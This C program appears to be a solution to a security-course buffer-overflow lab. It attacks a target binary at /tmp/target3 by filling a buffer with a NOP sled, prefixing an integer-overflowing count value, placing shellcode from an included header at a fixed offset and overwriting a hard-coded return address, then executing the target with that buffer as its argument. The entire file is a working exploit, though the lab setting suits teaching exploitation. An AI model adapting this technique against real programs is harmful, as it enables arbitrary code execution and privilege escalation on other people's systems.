#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define BUFFER_SIZE 4820
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1]; 
  int bsize = BUFFER_SIZE;
  int i,j;
  char buff[bsize];
  

  //Fill buffer with Nops
  for (i = 0; i < bsize;i++) 
    buff[i] = NOP;

  //Copying the attack count value
   strncpy(buff,"2147483889,",11); 
  
  //put shellcode into buffer
  for (j = 0, i = 238*20; j < strlen(shellcode); i++,j++)
     buff[i] = shellcode[j];

  
   //put shellcode address at the end of the buffer
   long *tmp = (long *)(buff + (240*20)+15);
   *tmp = 0xbfffd8c8;
   //strncpy(buff+(240*20)+15, "\x40\xdc\xff\xbf",4);



 // printf("buffer:%s\n",buff); 
  
   

  args[0] = TARGET; 
  args[1] = buff;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
